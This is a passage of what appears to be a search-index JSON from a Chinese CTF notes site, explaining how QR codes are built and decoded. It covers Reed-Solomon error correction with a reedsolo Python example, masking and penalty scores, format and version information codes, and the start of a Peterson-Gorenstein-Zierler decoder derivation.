\u8ba1\u7b97\u51fa\u7cfb\u6570\u7684\u503c\uff1a \\[16x^{25}+163x^{24}+243x^{23}+85x^{22}+146x^{21}+\\\\\\\\176x^{20}+52x^{19}+3x^{18}\\] \u4e4b\u540e\u4e0e\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u5f02\u6216\u5f97\u5230\uff1a \\[131x^{24}+136x^{23}+197x^{22}+181x^{21}+216x^{19}+18x^{18}+\\\\\\\\236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u8fd9\u4e4b\u540e\u6700\u9ad8\u6b21\u5c31\u53d8\u6210\u4e86 24 \u6b21\uff0c\u91cd\u590d\u6574\u4e2a\u8fc7\u7a0b\u76f4\u5230\u7ed3\u679c\u53ea\u5269\u4e0b 7 \u9879\uff08\u5373\u6700\u9ad8\u6b21\u4e3a 6 \u6b21\uff09\u65f6\u5373\u53ef\u5f97\u5230\uff1a \\[188x^6+247x^5+62x^4+248x^3+53x^2+170x+224\\] \u6240\u4ee5\u7ea0\u9519\u7801\u5c31\u662f\uff1a 188 247 62 248 53 170 224 \u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff1a 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u6240\u4ee5\u6574\u4e2a\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u533a\u57df\uff08\u9664\u683c\u5f0f\u4fe1\u606f\u5916\uff09\u5168\u90e8\u5185\u5bb9\u5c31\u662f\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u7ea0\u9519\u7801\u53ef\u4ee5\u76f4\u63a5\u7528 python \u7684 reedsolo \u5305\u6765\u6c42\u89e3\uff1a >>> from reedsolo import RSCodec , ReedSolomonError >>> rsc = RSCodec ( 7 ) >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ])) [ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 188 , 247 , 62 , 248 , 53 , 170 , 224 ] >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ]))[ - 7 :] [ 188 , 247 , 62 , 248 , 53 , 170 , 224 ]","title":"\u751f\u6210\u7ea0\u9519\u7801"},{"location":"ctf/qrcode/#76710","text":"","title":"\u5269\u4f59\u6b65\u9aa4\uff087.6~7.10\uff09"},{"location":"ctf/qrcode/#76","text":"\u9996\u5148\u6309\u7167 2 \u4e2d\u6240\u8ff0\u7ed9\u5b8c\u6574\u4fe1\u606f\u7f16\u7801\u6210\u6570\u636e\u5e8f\u5217\uff0c\u5176\u4e2d\u4e5f\u5305\u542b padding bits\uff0c\u4e14\u957f\u5ea6\u4e3a 8 \u7684\u500d\u6570 \u7136\u540e\u6839\u636e 3.1.1 \u4e2d\u6240\u8bf4\u5bf9\u6570\u636e\u5e8f\u5217\u8fdb\u884c\u5206\u5757\uff0c\u7136\u540e\u5bf9\u6bcf\u5757\u5206\u522b\u751f\u6210\u7ea0\u9519\u7801 \u6700\u540e\u628a\u6570\u636e\u5e8f\u5217\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4f9d\u6b21\u4ea4\u9519\u5408\u6210\u65b0\u7684\u6570\u636e\u5e8f\u5217\uff0c\u7136\u540e\u628a\u7ea0\u9519\u7801\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4ea4\u9519\u5408\u6210\u7ea0\u9519\u7801\u5e8f\u5217\u3002\u628a\u65b0\u7684\u6570\u636e\u5e8f\u5217\u548c\u7ea0\u9519\u7801\u5e8f\u5217\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5982\u679c\u603b\u957f\u5ea6\u4e0d\u591f\u4e8c\u7ef4\u7801\u7684\u5bb9\u91cf\uff0c\u5219\u5728\u540e\u9762\u8865\u5145 3/4/7 \u4e2a 0 \u6bd4\u7279\uff08\u9700\u8981\u8865\u591a\u5c11\u5728 Table 1 \u4e2d\u6709\u5b9a\u4e49\uff09 \u800c\u4e14\u8fd9\u6837\u4e5f\u8981\u4fdd\u8bc1\u6700\u77ed\u7684\u6570\u636e\u5757\u5728\u6700\u524d\u9762\uff08\u5df2\u7ecf\u7531 Table 9 \u5b9a\u4e49\uff09 \u6bd4\u5982 5-H \u7248\u672c\u7684\u5e8f\u5217\uff0c\u9700\u8981\u5206\u4e3a 4 \u5757\uff0c\u524d\u4e24\u5757\u662f 11 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff0c\u540e\u4e24\u5757\u662f 12 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff1a \u6700\u540e\u7684\u5e8f\u5217\u5c31\u662f \\(D_1,D_{12},D_{23},D_{35},\\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\\cdots,E_{88}\\)","title":"\u5408\u6210\u5e8f\u5217\uff087.6\uff09"},{"location":"ctf/qrcode/#77","text":"\u628a\u524d\u9762\u5408\u6210\u7684\u5b8c\u6574\u6d88\u606f\u5e8f\u5217\u586b\u5230\u4e8c\u7ef4\u7801\u4e2d\uff0c\u9996\u5148\u8981\u5148\u586b\u5145\u529f\u80fd\u56fe\u6848\uff0c\u7136\u540e\u9884\u7559\u51fa\u683c\u5f0f\u4fe1\u606f\u3001\u7248\u672c\u4fe1\u606f\u7684\u4f4d\u7f6e \u586b\u5145\u65f6\u4ee5\u4e24\u5217\u4e3a\u5355\u4f4d\uff0c\u5373\u6bcf\u6b21\u4ea4\u66ff\u586b\u5145\u4e24\u5217\u3002\u4ece\u6700\u53f3\u4e0b\u89d2\u5f00\u59cb\u662f\u6700\u9ad8\u4f4d\u7684\u6bd4\u7279\uff0c\u7136\u540e\u4ece\u53f3\u5411\u5de6\u4ece\u4e0b\u5411\u4e0a\u4ea4\u66ff\u586b\u5145\uff0c\u5230\u4e86\u4e0a\u754c\u65f6\u5de6\u8f6c\u5411\u4e0b\u7ee7\u7eed\u586b\u5145\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u76f4\u63a5\u7a7f\u8fc7\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u8fb9\u754c\u5219\u53d8\u4e3a\u4e00\u884c \u4e5f\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u6765\u4f9d\u6b21\u586b\u5145\uff0c\u5982\u679c\u662f\u5411\u4e0a\u586b\u5145\uff0c\u5219\u6700\u9ad8\u4f4d\u5728\u4e0b\u7aef\uff0c\u53cd\u4e4b\u5728\u4e0a\u6bb5\u3002\u6bcf\u4e2a\u5b57\u8282\u5757\u5185\u7684\u6700\u9ad8\u4f4d\u5c3d\u91cf\u53d6\u6700\u53f3\u4fa7\u7684\uff0c\u4f46\u5982\u679c\u6700\u4e0b(\u4e0a)\u7aef\u53ea\u6709\u4e00\u4e2a\u6bd4\u7279\u7684\u4f4d\u7f6e\uff0c\u5219\u9009\u5b83\u4f5c\u4e3a\u6700\u9ad8\u6bd4\u7279\u7684\u4f4d\u7f6e \u53cd\u6b63\u6309\u987a\u5e8f\u6b63\u5e38\u586b\u5c31\u884c\u4e86\uff0c\u9047\u5230\u4e1c\u897f\u5c31\u7ed5 \u5177\u4f53\u89c4\u5219","title":"\u586b\u5145\u6570\u636e\uff087.7\uff09"},{"location":"ctf/qrcode/#78","text":"\u586b\u5145\u540e\u7684\u6570\u636e\u8fd8\u8981\u906e\u76d6\u4e00\u5c42\u63a9\u7801\uff08\u5f02\u6216\uff09\u6765\u5e73\u8861\u9ed1\u767d\u5757\u7684\u6570\u91cf\uff0c\u4ee5\u53ca\u51cf\u5c11\u5bb9\u6613\u4ea7\u751f\u626b\u63cf\u9519\u8bef\u7684\u5927\u5757\u548c\u5f62\u4f3c\u529f\u80fd\u56fe\u6848\u7684\u90e8\u5206\u51fa\u73b0 QR \u7801\u4e00\u5171\u6709 8 \u79cd\u63a9\u7801\uff0c\u6bcf\u4e2a\u63a9\u7801\u6709\u4e00\u4e2a 3 bits \u7684\u7f16\u53f7\uff0c\u548c\u4e00\u4e2a\u751f\u6210\u516c\u5f0f\u3002\u8fd9\u4e2a\u516c\u5f0f\u7528\u6765\u751f\u6210\u63a9\u7801\u56fe\u6837\uff0c\u4ee5\u5de6\u4e0a\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u3001\u4e0b\u4e3a\u6b63\u65b9\u5411\uff0c\u5750\u6807\u6ee1\u8db3\u8fd9\u4e2a\u516c\u5f0f\u7684\u70b9\u5728\u56fe\u6837\u4e2d\u662f\u9ed1\u8272\uff081\uff09\uff0c\u4e0d\u6ee1\u8db3\u7684\u662f\u767d\u8272\uff080\uff09\u3002\u5728\u7248\u672c 1 \u4e2d\u7684\u63a9\u7801\u56fe\u50cf\u8868\u73b0\u4e3a\uff1a \u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u5c31\u662f\u628a\u9664\u53bb\u529f\u80fd\u56fe\u6848\u548c\u7248\u672c\u4fe1\u606f\u3001\u683c\u5f0f\u4fe1\u606f\u4e4b\u5916\u7684\u6570\u636e\u90e8\u5206\u6bcf\u4e00\u5757\u7684\u503c\u4e0e\u63a9\u7801\u56fe\u6837\u5f02\u6216 \u6574\u4e2a\u64cd\u4f5c\u9700\u8981\u751f\u6210\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u63a9\u7801\u7684 8 \u4e2a\u56fe\u6837\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u635f\u5931\u5206\u6570\uff08penalty points score\uff09\uff0c\u7136\u540e\u91c7\u7528\u635f\u5931\u5206\u6570\u6700\u5c0f\u7684\u63a9\u7801\u6a21\u5f0f\u4f5c\u4e3a\u6700\u7ec8\u7684\u63a9\u7801\u6a21\u5f0f","title":"\u63a9\u7801\u906e\u76d6\uff087.8\uff09"},{"location":"ctf/qrcode/#783","text":"\u867d\u7136\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u65f6\u4ec5\u5bf9\u975e\u529f\u80fd\u56fe\u6848\u3001\u975e\u7248\u672c\u4fe1\u606f\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u636e\u533a\u57df\u8fdb\u884c\u63a9\u7801\uff0c\u4f46\u662f\u8ba1\u7b97\u635f\u5931\u5206\u6570\u65f6\u6309\u7167\u6574\u4e2a\u4e8c\u7ef4\u7801\u8ba1\u7b97 \u8ba1\u7b97\u635f\u5931\u5206\u6709\u56db\u4e2a\u89c4\u5219\uff1a \u76f8\u90bb\u4e00\u884c\u6216\u4e00\u5217\u5185\u51fa\u73b0\u8fde\u7eed\u4e94\u4e2a\u76f8\u540c\u989c\u8272\u5757\u65f6\u635f\u5931\u5206 +3\uff0c\u4e4b\u540e\u8fde\u7eed\u5757\u6570\u6bcf\u52a0\u4e00\uff0c\u635f\u5931\u5206 +1 \u5bfb\u627e\u5185\u90e8\u989c\u8272\u76f8\u540c\u7684 2*2 \u7684\u5757\uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +3 \u5728\u6bcf\u884c\u548c\u6bcf\u5217\u4e2d\u5bfb\u627e 10111010000 \u548c 00001011101 \uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +40 \u8bc4\u4f30\u9ed1\u8272\u5757\u5360\u5168\u90e8\u5757\u6570\u7684\u6bd4\u4f8b\uff0c\u5982\u679c\u5728 45%~55% \u95f4\u5219\u4e0d\u589e\u52a0\u635f\u5931\u5206\uff0c\u5728 40%~45%\u300155%~60% \u95f4\u5219\u635f\u5931\u5206 +10\uff0c\u5728 35%~40%\u300160%~65% \u95f4\u5219\u635f\u5931\u5206 +10*2\uff0c\u4ee5\u6b64\u7c7b\u63a8 \u66f4\u8be6\u7ec6\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\uff1a https://www.thonky.com/qr-code-tutorial/data-masking \u7136\u540e\u5bf9\u6240\u6709\u63a9\u7801\u7ed3\u679c\u8ba1\u7b97\u635f\u5931\u5206\u6570\u540e\u9009\u62e9\u5206\u6570\u6700\u4f4e\u7684\u4e00\u4e2a\u4f5c\u4e3a\u6700\u7ec8\u7ed3\u679c","title":"\u8ba1\u7b97\u635f\u5931\u5206\u6570\uff087.8.3\uff09"},{"location":"ctf/qrcode/#79","text":"QRCode \u7684\u683c\u5f0f\u4fe1\u606f\u662f 15 bits \u7684\u5e8f\u5217\uff0c\u5176\u4e2d\u524d 5 \u4f4d\u662f\u6570\u636e\uff0c\u540e 10 \u4f4d\u662f\u9488\u5bf9\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\uff08\u7531 (15, 5) BCH \u7801\u751f\u6210\uff09 5 bits \u7684\u6570\u636e\u524d 2 \u4f4d\u662f\u7ea0\u9519\u7b49\u7ea7\u6807\u8bc6\u7b26\uff0c\u5206\u522b\u662f L -> 01 \u3001M -> 00 \u3001Q -> 11 \u3001H -> 10 \u540e 3 \u4f4d\u662f\u4e0a\u9762\u8bf4\u5230\u7684\u63a9\u7801\u7f16\u53f7 \u7136\u540e\u540e\u63a5 10 bits \u7ea0\u9519\u7801\uff0c\u6700\u540e\u6574\u4f53\u5f02\u6216 101010000010010 \u9632\u6b62\u4ea7\u751f\u5168\u96f6\u6570\u636e\u5e8f\u5217","title":"\u683c\u5f0f\u4fe1\u606f\uff087.9\uff09"},{"location":"ctf/qrcode/#annex-c","text":"\u5148\u5f97\u5230\u524d 5 bits \u7684\u6570\u636e\uff0c\u7136\u540e\u5316\u4e3a\u591a\u9879\u5f0f\uff0c\u6574\u4f53\u4e58 \\(x^{10}\\) \uff0c\u518d\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{10}+x^8+x^5+x^4+x^2+x+1\\) \u5f97\u5230\u4f59\u6570\u8f6c\u6362\u4e3a\u540e 10 bits \u7684\u7ea0\u9519\u7801 \u4f8b\u5b50 \u7ea0\u9519\u7b49\u7ea7 M\uff0c\u63a9\u7801\u7f16\u53f7 101 5 bits \u6570\u636e\uff1a 00101 \u5199\u4e3a\u591a\u9879\u5f0f\uff1a \\(x^2+1\\) \u6574\u4f53\u4e58 \\(x^{10}\\) \uff1a \\(x^{12}+x^{10}\\) \u9664\u4ee5 \\(G(x)\\) \uff1a \u5546 \\(x^2\\) \uff0c\u4f59\u6570 \\(x^7+x^6+x^4+x^3+x^2\\) \u4f59\u6570\u8f6c\u4e3a 10 bits \u7ea0\u9519\u7801\uff1a 0011011100 \u52a0\u4e0a\u539f\u6570\u636e\uff1a 001010011011100 \u5f02\u6216 101010000010010 \uff1a 100000011001110 \u56e0\u4e3a 5 bits \u7684\u6570\u636e\u4e00\u5171\u53ea\u6709 32 \u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u9644\u5f55 C \u4e2d\u76f4\u63a5\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u8868\u683c\uff1a \u7ea0\u9519 \uff1a\u6700\u591a\u53ef\u4ee5\u7ea0\u6b63 3 bits \u7684\u9519\u8bef\uff0c\u5148\u628a\u683c\u5f0f\u4fe1\u606f\u5f02\u6216 101010000010010 \u5f97\u5230\u539f\u59cb\u5e8f\u5217\uff0c\u7136\u540e\u4e0e Table C.1 \u4e2d\u7684\u6709\u6548\u683c\u5f0f\u4fe1\u606f\u8fdb\u884c\u5bf9\u6bd4\uff0c\u5982\u679c\u627e\u4e0d\u5230\u8bf4\u660e\u6709\u9519\u8bef\u3002\u6b64\u65f6\u4ec5\u9009\u62e9 Table C.1 \u4e2d\u4e0e\u9519\u8bef\u683c\u5f0f\u4fe1\u606f\u76f8\u5dee\u6bd4\u7279\u6700\u5c11\u7684\u4e00\u4e2a\u4f5c\u4e3a\u7ea0\u6b63\u540e\u7684\u683c\u5f0f\u4fe1\u606f\u5373\u53ef\uff0c\u5982\u679c\u76f8\u5dee\u5c11\u4e8e\u7b49\u4e8e 3 \u4e2a\u6bd4\u7279\uff0c\u5219\u89c6\u4e3a\u7ea0\u6b63\u6210\u529f","title":"\u751f\u6210\u7ea0\u9519\u7801\uff08Annex C\uff09"},{"location":"ctf/qrcode/#_5","text":"\u5de6\u4e0a\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u533a\u57df\u586b\u5145\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\uff09\uff0c\u5de6\u4e0b\u89d2\u548c\u53f3\u4e0a\u89d2\u5408\u8d77\u6765\u662f\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\u4e0b\u89d2\u7684\u6700\u4e0b\uff0c\u6700\u4f4e\u4f4d\u5728\u53f3\u4e0a\u89d2\u7684\u6700\u53f3\uff09\u3002\u5e76\u4e14\u5de6\u4e0b\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u4e0a\u65b9\uff08\u4f4d\u7f6e (4V+9,8) \uff09\u6709\u4e00\u5757\u59cb\u7ec8\u662f\u9ed1\u8272\uff1a","title":"\u586b\u5165\u4e8c\u7ef4\u7801"},{"location":"ctf/qrcode/#710","text":"\u5728\u7248\u672c 7 \u53ca\u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u9700\u8981\u586b\u5165\u7248\u672c\u4fe1\u606f\u6765\u786e\u4fdd\u51c6\u786e\u5ea6 \u7248\u672c\u4fe1\u606f\u53ea\u50a8\u5b58\u4e86\u8be5\u4e8c\u7ef4\u7801\u7684\u7248\u672c\u53f7\uff087\uff5e40\uff09\uff0c\u4e00\u5171 18 bits\uff0c\u524d 6 bits \u4e3a\u7248\u672c\u53f7\u7684\u4e8c\u8fdb\u5236\uff08\u4ece 000111 \u5230 101000 \uff09\uff0c\u540e 12 bits \u4e3a\u7531 (18, 6) Golay code \u751f\u6210\u7684\u7ea0\u9519\u7801 \u4e0d\u540c\u4e8e\u683c\u5f0f\u4fe1\u606f\uff0c\u56e0\u4e3a\u7248\u672c\u53f7\u4e0d\u4f1a\u51fa\u73b0\u5168\u96f6\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c","title":"\u7248\u672c\u4fe1\u606f\uff087.10\uff09"},{"location":"ctf/qrcode/#annex-d","text":"\u548c\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\u7c7b\u4f3c\uff0c\u5148\u628a\u524d 6 bits \u8f6c\u4e3a\u591a\u9879\u5f0f\uff0c\u7136\u540e\u6574\u4f53\u4e58 \\(x^{12}\\) \uff0c\u5f97\u5230\u7684\u7ed3\u679c\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{12}+x^{11}+x^{10}+x^9+x^8+x^5+x^2+1\\) \uff0c\u628a\u4f59\u6570\u8f6c\u4e3a 12 bits \u4e8c\u8fdb\u5236\u5c31\u662f\u7ea0\u9519\u7801\u4e86 \u56e0\u4e3a\u53ea\u6709 34 \u4e2a\u7248\u672c\u6709\u7248\u672c\u4fe1\u606f\uff0c\u6240\u4ee5\u4e5f\u5c31\u53ea\u6709 34 \u79cd\u6709\u6548\u7684\u7248\u672c\u4fe1\u606f\u5e8f\u5217\uff0c\u9644\u5f55 D \u7684 Table D.1 \u4e2d\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684 34 \u4e2a\u7248\u672c\u4fe1\u606f\u5e8f\u5217 \u548c\u683c\u5f0f\u4fe1\u606f\u4e00\u6837\uff0c\u7ea0\u9519\u65f6\u5bf9\u7167\u8868\u683c\u9009\u62e9\u76f8\u5dee\u6bd4\u7279\u6570\u6700\u5c0f\u7684\u5373\u53ef\u3002\u5e76\u4e14\u7248\u672c\u4fe1\u606f\u4e5f\u53ea\u80fd\u7ea0\u6b63\u5c0f\u4e8e\u7b49\u4e8e 3 \u4e2a\u9519\u8bef","title":"\u751f\u6210\u7ea0\u9519\u7801\uff08Annex D\uff09"},{"location":"ctf/qrcode/#_6","text":"\u5728\u7248\u672c 7 \u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u5df2\u7ecf\u9884\u7559\u51fa\u4e86\u4e24\u4e2a 6*3 \u5927\u5c0f\u7684\u533a\u57df\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u5de6\u4e0b\u5206\u5272\u7ebf\u7684\u4e0a\u65b9\u65f6\u5e8f\u56fe\u6848\u5de6\u4fa7\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7\u65f6\u5e8f\u56fe\u6848\u7684\u4e0a\u65b9 \u6309\u7167\u4e0b\u56fe\u987a\u5e8f\u586b\u5165\u5373\u53ef\uff1a","title":"\u586b\u5165\u4e8c\u7ef4\u7801"},{"location":"ctf/qrcode/#11annex-b","text":"\u7b80\u8981\u7684\u89e3\u7801\u8fc7\u7a0b\uff1a \u5b9a\u4f4d\u5e76\u83b7\u53d6\u56fe\u50cf\u4e2d\u7684\u4e8c\u7ef4\u7801\uff0c\u5e76\u628a\u56fe\u50cf\u4e2d\u7684\u9ed1\u767d\u5757\u63d0\u53d6\u4e3a 1 \u548c 0 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f \u91ca\u653e\u63a9\u7801 101010000010010 \u8fdb\u884c\u7ea0\u9519 \u5982\u679c\u7ea0\u9519\u5931\u8d25\u5219\u5c06\u4e8c\u7ef4\u7801\u955c\u9762\u5bf9\u79f0\u518d\u5c1d\u8bd5 \u8bfb\u53d6\u7248\u672c\u4fe1\u606f\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f\u4e2d\u7684\u63a9\u7801\u7f16\u53f7\uff0c\u5e76\u91ca\u653e\u63a9\u7801 \u8bfb\u53d6\u5e76\u6062\u590d\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57 \u7ea0\u9519\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u5c31\u7ea0\u6b63 \u628a\u6570\u636e\u5b57\u89e3\u7801\u5f97\u5230\u7ed3\u679c","title":"\u89e3\u7801\uff0811\u3001Annex B\uff09"},{"location":"ctf/qrcode/#annex-b","text":"Annex B \u8bb2\u7684\u7ea0\u9519\u8fc7\u7a0b\u5f88\u7b80\u7565\uff0c\u800c\u4e14\u7b26\u53f7\u8bf4\u660e\u4e0d\u5168\uff0c\u5f88\u96be\u770b\u61c2 \u53bb\u5b66\u4e86\u5b66 PGZ \u89e3\u7801\uff1a Reed\u2013Solomon_error_correction#Peterson\u2013Gorenstein\u2013Zierler_decoder \u8bbe\u5f53\u524d\u7248\u672c\u4e0b\u6bcf\u5757\u4e2d\u6709 \\(n\\) \u4e2a\u5b57\uff0c \\(k\\) \u4e2a\u6570\u636e\u5b57\uff0c \\(n-k\\) \u4e2a\u7ea0\u9519\u5b57\uff0c\u7ea0\u9519\u5bb9\u91cf\u4e3a \\(\\nu\\) \u9996\u5148\u5b9a\u4e49\u539f\u6765\u7684\u5b8c\u6574\u6570\u636e\uff08\u5373\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57\uff09\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u4e3a \\(c_{n-1},c_{n-2},\\cdots,c_0\\) \uff0c\u5bf9\u5e94\u591a\u9879\u5f0f\u4e3a\uff1a \\[s(x)=\\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\\cdots+c_0\\] \u800c\u4e14\u6839\u636e\u7ea0\u9519\u7801\u751f\u6210\u539f\u7406\uff0c \\(s(x)\\) \u53ef\u4ee5\u88ab\u751f\u6210\u591a\u9879\u5f0f \\(g(x)\\) \u6574\u9664\uff0c\u5176\u4e2d \\[g(x)=\\prod_{i=0}^{n-k-1}(x-\\alpha^i)\\] \u6240\u4ee5 \\(s(x)\\) \u4e5f\u6709\u6839 \\(s(\\alpha^i)=0, i=0,1,\\dots n-k-1\\) \u518d\u8bbe\u63a5\u6536\u5230\u7684\u6d88\u606f\u591a\u9879\u5f0f\uff08\u53ef\u80fd\u6709\u9519\uff09\u4e3a \\(r(x)\\) \uff0c\u8bef\u5dee\u591a\u9879\u5f0f\u4e3a \\(e(x)\\) \uff0c\u6ee1\u8db3\uff1a \\[r(x)=s(x)+e(x),\\quad e(x)=\\sum_{i=0}^{n-1}e_ix^i\\] \u5148\u8bbe\u4e00\u5171\u6709 \\(\\nu\\) \u4e2a\u9519\u8bef\uff0c\u4e14\u6bcf\u4e2a\u9519\u8bef\u7684\u4f4d\u7f6e\u4e3a \\(i_k,k=0,1,\\dots \\nu-1\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[e(x)=\\sum_{k=0}^{\\nu-1}e_{i_k}x^{i_k}\\] \u6700\u7ec8\u7684\u76ee\u6807\u5c31\u662f\u627e\u5230\u9519\u8bef\u4e2a\u6570 \\(\\nu\\) \uff0c\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \uff0c\u4ee5\u53ca\u9519\u8bef\u5927\u5c0f \\(e_{i_k}\\)","title":"\u7ea0\u9519\uff08Annex B\uff09"},{"location":"ctf/qrcode/#_7","text":"\u9996\u5148\u5b9a\u4e49\u5178\u578b\u503c\uff08syndromes\uff09\u4e3a\u628a \\(\\alpha^j\\) \u4f20\u5165 \\(r(x)\\) \u5f97\u5230\u7684\u503c \\(S_j\\) \uff0c\u6709\uff1a \\[S_j=r(\\alpha^j)=s(\\alpha^j)+e(\\alpha^j)=e(\\alpha^j)=\\sum_{k=0}^{\\nu-1}e_{i_k}(\\alpha^j)^{i_k},j=0,1,\\dots,n-k-1\\] \u6b64\u65f6\u5982\u679c\u5f97\u5230\u7684\u5178\u578b\u503c\u90fd\u4e3a 0\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u9519\u8bef \u4e3a\u4e86\u65b9\u4fbf\uff0c\u518d\u4ee4 \\(X_k=\\alpha^{i_k},Y_k=e_{i_k}\\) \uff0c\u8fd9\u6837 \\(X_k\\) \u4e5f\u80fd\u7528\u6765\u5b9a\u4f4d\u9519\u8bef\uff0c\u540c\u65f6\u4e5f\u6709\uff1a \\[S_j=\\sum_{k=0}^{\\nu-1}Y_kX_k^j\\] \u5199\u6210\u77e9\u9635\u5f62\u5f0f\u5c31\u662f\uff1a \\[\\begin{bmatrix} X_0^0 &X_2^0 &\\cdots &X_{\\nu-1}^0\\\\\\\\ X_0^1 &X_1^1 &\\cdots &X_{\\nu-1}^1\\\\\\\\ \\vdots &\\vdots & &\\vdots\\\\\\\\ X_0^{n-k-1} &X_1^{n-k-1} &\\cdots &X_{\\nu-1}^{n-k-1} \\end{bmatrix} \\begin{bmatrix} Y_0\\\\\\\\Y_1\\\\\\\\\\vdots\\\\\\\\Y_{\\nu-1} \\end{bmatrix}= \\begin{bmatrix} S_0\\\\\\\\S_1\\\\\\\\\\vdots\\\\\\\\S_{n-k-1} \\end{bmatrix}\\] \u6240\u4ee5\u53ea\u8981\u6c42\u5f97\u4f4d\u7f6e \\(X_k\\) \u5c31\u80fd\u5f97\u5230\u9519\u8bef\u5927\u5c0f\uff0c\u4f46\u662f\u6b64\u65f6\u5e76\u4e0d\u662f\u7ebf\u6027\u7684","title":"\u8ba1\u7b97\u5178\u578b\u503c"},{"location":"ctf/qrcode/#_8","text":"\u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f\uff08error locator polynomial\uff09 \\(\\Lambda(x)\\) \uff1a \\[\\Lambda(x)=\\prod_{k=0}^{\\nu-1}(1-xX_k)=1+\\Lambda_1x+\\Lambda_2x^2+\\cdots+\\Lambda_\\nu x^\\nu\\] \u53ef\u4ee5\u770b\u51fa \\(\\Lambda(X_k^{-1})=0\\) \uff0c\u6240\u4ee5\u5bf9\u4e8e \\(0\\leq j\\leq\\nu-1\\) \u6709\uff1a \\[ Y_kX_k^{j+\\nu}\\Lambda(X_k^{-1}) =0 \\] \\[ Y_{k}X_{k}^{j+\\nu }(1+\\Lambda _{1}X_{k}^{-1}+\\Lambda _{2}X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }X_{k}^{-\\nu })=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu }X_{k}^{-1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu }X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j+\\nu }X_{k}^{-\\nu }=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}=0 \\] \u6240\u4ee5\u628a \\(k\\) \u4ece \\(0\\) \u5230 \\(\\nu-1\\) \u7d2f\u52a0\u8d77\u6765\u4e5f\u4e3a 0\uff1a \\[\\sum_{k=0}^{\\nu-1}\\left(Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda 